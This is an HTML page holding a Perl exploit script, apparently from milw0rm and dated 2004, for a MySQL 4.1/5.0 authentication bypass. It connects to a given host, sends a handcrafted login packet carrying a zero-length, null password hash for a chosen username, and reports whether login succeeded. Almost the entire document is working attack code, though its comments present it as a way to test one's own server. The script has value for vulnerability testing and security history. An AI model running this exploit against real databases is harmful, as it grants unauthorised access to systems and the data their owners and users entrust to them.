<html><head><title>MySQL 4.1/5.0 zero-length password Auth. Bypass Exploit
</title></head><pre>#!/usr/bin/perl
#
# The script connects to MySQL and attempts to log in using a zero-length password
# Based on the vuln found by NGSSecurity
#
# The following Perl script can be used to test your version of MySQL. It will display 
# the login packet sent to the server and it's reply.
# 
# Exploit copyright (c) 2004 by Eli Kara, Beyond Security
# elik beyondsecurity com
#
use strict;
use IO::Socket::INET;

usage() unless ((@ARGV &gt;= 1) || (@ARGV &lt;= 3));

my $username = shift(@ARGV);
my $host = shift(@ARGV);
if (!$host)
{
  usage();
}
my $port = shift(@ARGV);
if (!$port)
{
 $port = 3306; print &quot;Using default MySQL port (3306)\n&quot;;
}

# create the socket
my $socket = IO::Socket::INET-&gt;new(proto=&gt;'tcp', PeerAddr=&gt;$host, PeerPort=&gt;$port);
$socket or die &quot;Cannot connect to host!\n&quot;;

# receive greeting
my $reply;
recv($socket, $reply, 1024, 0);
if (length($reply) &lt; 7)
{
 print &quot;Not allowed to connect to MySQL!\n&quot;;
 exit(1);
}
print &quot;Received greeting:\n&quot;;
HexDump($reply);
print &quot;\n&quot;;

# here we define the login OK reply
# my $login_ok = &quot;\x01\x00\x00\x02\xFE&quot;;

# break the username string into chars and rebuild it
my $binuser = pack(&quot;C*&quot;, unpack(&quot;C*&quot;, $username));

# send login caps packet with password
my $packet = &quot;\x85\xa6&quot;. 
             &quot;\x03\x00\x00&quot;.
    &quot;\x00&quot;.
    &quot;\x00\x01\x08\x00\x00\x00&quot;. # capabilities, max packet, etc..
             &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
             &quot;\x00\x00\x00\x00&quot;.$binuser.&quot;\x00\x14\x00\x00\x00\x00&quot;. # username and pword hash length + NULL hash
             &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;; # continue NULL hash

substr($packet, 0, 0) = pack(&quot;C1&quot;, length($packet)) . &quot;\x00\x00\x01&quot;; # MySQL message length + packet number (1)

print &quot;Sending caps packet:\n&quot;;
HexDump($packet);
print &quot;\n&quot;;
send $socket, $packet, 0;

# receive reply
recv($socket, $reply, 1024, 0);
print &quot;Received reply:\n&quot;;
HexDump($reply);

my @list_bytes = unpack(&quot;C*&quot;, $reply);

#print &quot;The fifth byte is: &quot;, $list_bytes[4], &quot;\n&quot;;
if (length(@list_bytes) &gt;= 4)
{
 print &quot;Response insufficent\n&quot;;
}

#if ($reply eq $login_ok)
if ($list_bytes[4] == 0 || $list_bytes[4] == 254)
{
 print &quot;Received OK reply, authentication successful!!\n&quot;;
}
else
{
 print &quot;Authentication failed!\n&quot;;
}

# close
close($socket);


sub usage
{
    # print usage information
    print &quot;\nUsage: mysql_auth_bypass_zeropass.pl &lt;username&gt; &lt;host&gt; [port]\n
&lt;username&gt; - The DB username to authenticate as
&lt;host&gt; - The host to connect to
[port] - The TCP port which MySQL is listening on (optional, default is 3306)\n\n&quot;;
    exit(1);
}


###
# do a hexdump of a string (assuming it's binary)
###
sub HexDump
{
 my $buffer = $_[0];

 # unpack it into chars
 my @up = unpack(&quot;C*&quot;, $buffer);
 my $pos=0;

 # calculate matrix sizes
 my $rows = int(@up/16);
 my $leftover = int(@up%16);

 for( my $row=0; $row &lt; $rows ; $row++, $pos+=16)
 {
  printf(&quot;%08X\t&quot;, $pos);
  my @values = @up[$pos .. $pos+15];
  my @line;
  foreach my $val (@values)
  {
   push(@line, sprintf(&quot;%02X&quot;, $val));
  }
  print join(' ', @line), &quot;\n&quot;;
 }
 # print last line
 printf(&quot;%08X\t&quot;, $pos);
 my @values = @up[$pos .. $pos+$leftover-1];
 my @line;
 foreach my $val (@values)
 {
  push(@line, sprintf(&quot;%02X&quot;, $val));
 }
 print join(' ', @line), &quot;\n&quot;;
}

# milw0rm.com [2004-07-10]</pre></html>